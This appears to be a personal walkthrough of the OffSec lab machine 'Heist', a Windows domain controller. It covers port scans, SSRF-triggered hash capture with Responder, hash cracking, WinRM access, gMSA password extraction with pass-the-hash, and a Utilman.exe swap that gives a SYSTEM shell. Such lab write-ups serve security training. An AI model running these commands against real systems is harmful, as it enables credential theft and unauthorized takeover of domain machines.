---
Alias: Heist
Date: 9/9/2022
Platform: Windows
Difficulty: Hard
Tags: #SSRFvulnerability #responder #evil-winrm  #Winrmshell
Status: Finished
IP: 192.168.231.165 
---

# {{Heist}}


# Resolution summary
- Text
- Text

## Improved skills
- Active Directory enumeration
- Bloodhound tool enumerating
- crackmapexec enumerating 

## Used tools
- nmap
- rustscan
- rdesktop
- Responder
- Bloodhound
- Neo4j console
- Crackmapexec
- evil-winrm

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.231.165 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.231.165:53
Open 192.168.231.165:88
Open 192.168.231.165:135
Open 192.168.231.165:139
Open 192.168.231.165:389
Open 192.168.231.165:445
Open 192.168.231.165:464
Open 192.168.231.165:593
Open 192.168.231.165:636
Open 192.168.231.165:3268
Open 192.168.231.165:3269
Open 192.168.231.165:3389
Open 192.168.231.165:5985
Open 192.168.231.165:8080
Open 192.168.231.165:9389
Open 192.168.231.165:49666
Open 192.168.231.165:49669
Open 192.168.231.165:49668
Open 192.168.231.165:49670
Open 192.168.231.165:49672
Open 192.168.231.165:49689
Open 192.168.231.165:49716
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.231.165
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 20:18 PDT
Happy 25th Birthday to Nmap, may it live to be 125!
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:18
Completed Parallel DNS resolution of 1 host. at 20:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:18
Scanning 192.168.231.165 [22 ports]
Discovered open port 135/tcp on 192.168.231.165
Discovered open port 139/tcp on 192.168.231.165
Connect Scan Timing: About 11.36% done; ETC: 20:25 (0:05:51 remaining)
Discovered open port 8080/tcp on 192.168.231.165
Discovered open port 53/tcp on 192.168.231.165
Connect Scan Timing: About 20.45% done; ETC: 20:24 (0:04:52 remaining)
Discovered open port 3389/tcp on 192.168.231.165
Discovered open port 445/tcp on 192.168.231.165
Connect Scan Timing: About 29.55% done; ETC: 20:24 (0:04:10 remaining)
Discovered open port 49669/tcp on 192.168.231.165
Discovered open port 49716/tcp on 192.168.231.165
Connect Scan Timing: About 38.64% done; ETC: 20:24 (0:03:34 remaining)
Discovered open port 593/tcp on 192.168.231.165
Discovered open port 88/tcp on 192.168.231.165
Discovered open port 49672/tcp on 192.168.231.165
Connect Scan Timing: About 52.27% done; ETC: 20:24 (0:02:58 remaining)
Discovered open port 3268/tcp on 192.168.231.165
Discovered open port 5985/tcp on 192.168.231.165
Connect Scan Timing: About 61.36% done; ETC: 20:24 (0:02:22 remaining)
Discovered open port 49670/tcp on 192.168.231.165
Discovered open port 49689/tcp on 192.168.231.165
Connect Scan Timing: About 70.45% done; ETC: 20:24 (0:01:47 remaining)
Discovered open port 9389/tcp on 192.168.231.165
Discovered open port 636/tcp on 192.168.231.165
Connect Scan Timing: About 79.55% done; ETC: 20:24 (0:01:13 remaining)
Discovered open port 49668/tcp on 192.168.231.165
Discovered open port 389/tcp on 192.168.231.165
Connect Scan Timing: About 88.64% done; ETC: 20:24 (0:00:40 remaining)
Discovered open port 464/tcp on 192.168.231.165
Discovered open port 3269/tcp on 192.168.231.165
Discovered open port 49666/tcp on 192.168.231.165
Completed Connect Scan at 20:24, 360.18s elapsed (22 total ports)
Initiating Service scan at 20:24
Scanning 22 services on 192.168.231.165
Service scan Timing: About 22.73% done; ETC: 20:26 (0:01:49 remaining)
Service scan Timing: About 31.82% done; ETC: 20:27 (0:02:13 remaining)
Service scan Timing: About 68.18% done; ETC: 20:26 (0:00:45 remaining)
Service scan Timing: About 72.73% done; ETC: 20:27 (0:00:57 remaining)
Service scan Timing: About 81.82% done; ETC: 20:29 (0:00:59 remaining)
Service scan Timing: About 90.91% done; ETC: 20:30 (0:00:32 remaining)
Completed Service scan at 20:31, 433.82s elapsed (22 services on 1 host)
NSE: Script scanning 192.168.231.165.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:31
NSE Timing: About 98.13% done; ETC: 20:32 (0:00:01 remaining)
NSE Timing: About 99.23% done; ETC: 20:32 (0:00:00 remaining)
Completed NSE at 20:32, 76.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:33, 5.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Nmap scan report for 192.168.231.165
Host is up, received user-set (0.16s latency).
Scanned at 2022-09-01 20:18:42 PDT for 861s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-09-02 03:24:40Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-02T03:32:54+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Issuer: commonName=DC01.heist.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-17T22:04:25
| Not valid after:  2023-01-16T22:04:25
| MD5:   73c5 30c0 df09 668f d701 ff17 6129 0493
| SHA-1: 74b0 f22f 5449 5d47 b100 4ffe 266d c51c 8d9b 2d5d
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQbNn2IUrUjY9PdO2Odd610zANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFEQzAxLmhlaXN0Lm9mZnNlYzAeFw0yMjA3MTcyMjA0MjVaFw0y
| MzAxMTYyMjA0MjVaMBwxGjAYBgNVBAMTEURDMDEuaGVpc3Qub2Zmc2VjMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvFxcdBIGl7TjIoHZGdLV9Kzu+4o4
| e/p2hQj8A8ES3sVFiWDjJRQtGueQIYjIe6iUjAvwURU/okUe1DGUTKpelabApuVi
| kbQnnlGxOXdisdfqt+p5spSeq4/qB5B/OCC+/5ZgtARhtUTKoDP8WECwMrORQr8x
| nqQlpDdus7SXsJrDhv2f29YCDsN0oyd0f6x1LUuJE1glGb/nBJcYtU+npaYJbe7W
| 1FD/i5LUR3tS1D89Fa9jjjoCdo5Zknb+vdXiMGPlsIgBVoNqVdd6gqmO6bIX0J/I
| PL2txQKwcuK7p+9jFc+G6sbHQHyGUyx4T0GP2lCRvosXVNA/v/1Miuu59QIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAF+bP5Z/SwmiKeDOmwTXIBHPY5cvhDQCSsLXkSYSlrPB4X2KggaK
| IA473Gnx8X0mm3OR/GN6u4a8OrgEKOhA4IFkv2GWE03zX5OIFy5o/mEtFeOMvfOc
| 0XgLjzBFp15r54UqrT+ZlDTx4ktcdy6Or7pqStwp/OZkVz8JSRXXMDG9t6bRWcA/
| 0pGkPcxYoMr35RSjsh/TkQaySnORugXbggeyWm+yv3EGQEyXQpB/84jl64+WnQCW
| ZG44P4PfAWOxeDlaoY46thr/9OZuPU9FBERGzyrK1zlz8yTUEVvRzHqtkVuJ//IE
| ulwyR0DC8nLrOAqTOXttifFW8fsf6qFRnjQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-09-02T03:33:01+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          syn-ack Werkzeug httpd 2.0.1 (Python 3.9.0)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-02T03:32:40
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56666/tcp): CLEAN (Timeout)
|   Check 2 (port 39499/tcp): CLEAN (Timeout)
|   Check 3 (port 11903/udp): CLEAN (Timeout)
|   Check 4 (port 7767/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 876.72 seconds







nmap -sC -sV -p 53,88,135,139,445,464,593,636,3268,3269,3389,5985,8080,9389,49666,49669,49668,49670,49672,49689,49716 192.168.231.165 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 20:26 PDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 61.90% done; ETC: 20:27 (0:00:08 remaining)
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:06 remaining)
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:08 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:11 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 20:27 (0:00:18 remaining)
Nmap scan report for 192.168.231.165
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-02 03:26:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-09-02T03:28:18+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-02T03:27:40+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2022-07-17T22:04:25
|_Not valid after:  2023-01-16T22:04:25
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-02T03:27:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.06 seconds
```

Enumerated open TCP ports:
```bash
8080
5985
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080

#### -Navigated to "http://192.168.231.165:8080/" and found the following webpage:

![](Pasted%20image%2020221012174609.png)


#### -Typed "updog -p 445" on kali machine to fire up an HTTP Server

#### - Typed "http://[Kali IP]:445" into the "Enter URL" bar and clicked the search icon

![](Pasted%20image%2020221012174728.png)

#### - I was able to access my server. This confirmed that this server is vulnerable to SSRF

![](Pasted%20image%2020221012174847.png)
![](Pasted%20image%2020221012180025.png)
#SSRFvulnerability

#### - Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example clicking on utils.py file brings us to "http://192.168.231.165:8080/utils.py" which obviously doesn't exist:

![](Pasted%20image%2020221012181158.png)

#### - However, by adding the filename in the initial search it reads the file I select but does not execute it.

![](Pasted%20image%2020221012181305.png)

![](Pasted%20image%2020221012181352.png)

#### - It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting: In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. 

#### A specific tool that can be used to intercept authorization credentials when an arbitrary connection is made to a system is **Responder**.

#### - With this information, we should be able to setup Responder to create a spoofed WPAD proxy server and then search for an arbitrary domain using the URL search bar on the web server. After the request is made, we should see responder intercept the request and dump the hash of the user who owns the webserver.

---

# Exploitation
## Recieve username and NetNTLMv2 hashed password utilizing Responder

#### - Fire up Responder with the following command:

responder -I tun0 -wv

#responder

#### - Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.

![](Pasted%20image%2020221012181516.png)

#### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.

![](Pasted%20image%2020221012181626.png)

#### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:

hashcat -h | grep -i "ntlmv2"
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

#### - After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.

#### - Cat "cracked.txt" file which shows username enox and password california


#### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:


![](Pasted%20image%2020221012181836.png)


#### - Typed "evil-winrm -i 192.168.123.165 -u enox -p california" and received the below winrm shell:

![](Pasted%20image%2020221012212318.png)
#evil-winrm  #Winrmshell


---

# Lateral Movement to user
## Local Enumeration

#### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships

![](Pasted%20image%2020221012182010.png)

#### - Attempted to enumerate Privelege Escalation vectors by utilizing PowerUp.ps1 and other privilege escalation scripts but found nothing

#### - Typed "sudo neo4j console"  on my kali machine and logged into the console using my neo4j credentials

#### - Navigated to another terminal on my kali machine and typed "bloodhound" and logged into bloodhound utilizing my neo4j credentials

#### - Navigated back to another terminal session on my kali machine and typed "bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all" and retreived the following computers, domains, groups and users information in .json format from the target machine in order to upload the information to bloodhound:

![](Pasted%20image%2020221012213928.png)
![](Pasted%20image%2020221012214003.png)

#### - Navigated to bloodhound and clicked "upload data". Then highlighted all the .json files and clicked open.  The target machines actived directory information was uploaded to bloodhound.

#### - Clicked the hamburger icon in the upper left hand corner of bloodhound and then clicked the "Analysis"tab to see a list of pre-built queries.

![](Pasted%20image%2020221012214126.png)

#### - Going from the bottom up on this list, nothing was providing data until I got to **Shortest Paths to High Value Targets**, which revealed nothing interesting about my current user; however, it did show some interesting info on the service account.

![](Pasted%20image%2020221012214301.png)
#ADservicecanreadGMSApassword #GMSA #GroupManagedServiceAccount

#### - This shows that the **svc_apache** service account can read the GMSA password, which means that the **svc_apache** account is a Group Managed Service Account (gMSA).

#### - Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled:

Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

![](Pasted%20image%2020221012214423.png)

#### - This shows that members of Web Admins group can retrieve the gMSA password. Earlier during the manual enumeration, we saw that our current user **enox** was a member of this group! This also shows that the svc_apache account is in the remote users group, which means that once we extract the gMSA password, we can remote in with this account using evil-winrm.

#### - Just to be certain, we can double check that our user is in the Web Admins group using the following command:

Get-ADGroupMember 'Web Admins'

![](Pasted%20image%2020221012214545.png)


## Lateral Movement vector

#### - Googled "gMSA password extraction tool github" and found the following tool to extract the NT hash from the active directory:

![](Pasted%20image%2020221012215446.png)

![](Pasted%20image%2020221012215548.png)

#### - Downloaded the GMSAPasswordReader.exe precompiled binary to target machine

#### - Typed .\GMSAPasswordReader.exe --AccountName 'svc_apache' and retreived the following  NTLM hash:

![](Pasted%20image%2020221012215649.png)

#### - The rc4_hmac hash is the same as the NT hash, they are interchangeable.
#rc4_hmac

#### - Typed evil-winrm -i 192.168.81.165 -u svc_apache$ -H 4283B392D3647F3F26D614EE3AB9A80C and received a winrm login session as user svc_apache$
---

# Privilege Escalation
## Local Enumeration
#### - Typed whoami /priv and found SeRestorePrivilege is enabled:

![](Pasted%20image%2020221012220215.png)
#SeRestorePrivilegeEnabledPrivelegeEscalation

#### - Googled "SeRestorePrivilege privilege escalation" and found the following Hacktricks page showing the steps to escalate privileges:

![](Pasted%20image%2020221012220333.png)


## Privilege Escalation vector
## SeRestorePrivilege privilege escalation

#### - Navigated to "C:\Windows\system32" and located Utilman.exe:
![](Pasted%20image%2020221012220556.png)

#### - Typed "ren Utilman.exe Utilman.old" and confirmed the filename changed:

![](Pasted%20image%2020221012220652.png)

#### - Typed "ren cmd.exe Utilman.exe"

#### - Navigated to another terminal on my kali machine and typed "rdesktop 192.168.81.165"

#RDP #rdesktop

#### - Once at login page of RDP session I typed "windows key + u key" and received a cmd session as NT authority/system:

![](Pasted%20image%2020221012220806.png)

![](Pasted%20image%2020221012220843.png)

---
